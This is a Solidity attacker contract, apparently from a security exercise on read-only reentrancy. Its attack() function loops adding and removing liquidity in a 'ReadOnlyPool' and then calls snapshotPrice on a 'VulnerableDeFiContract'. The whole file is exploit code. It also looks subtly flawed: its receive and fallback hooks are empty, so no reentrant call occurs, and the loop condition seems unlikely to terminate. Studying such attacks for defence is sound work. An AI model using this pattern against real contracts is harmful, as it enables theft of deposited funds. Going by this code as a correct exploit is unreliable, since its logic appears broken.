// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../ReadOnly.sol";

contract ReadOnlyAttacker {
    address pool;
    address defi;

    constructor(address _pool, address _defi) {
        pool = _pool;
        defi = _defi;
    }

    function attack() public payable {
        while (ReadOnlyPool(pool).getVirtualPrice() > 0) {
            ReadOnlyPool(pool).addLiquidity{value: msg.value}();
            ReadOnlyPool(pool).removeLiquidity();
        }
        VulnerableDeFiContract(defi).snapshotPrice();
    }

    receive() external payable {}
    fallback() external payable {}
}
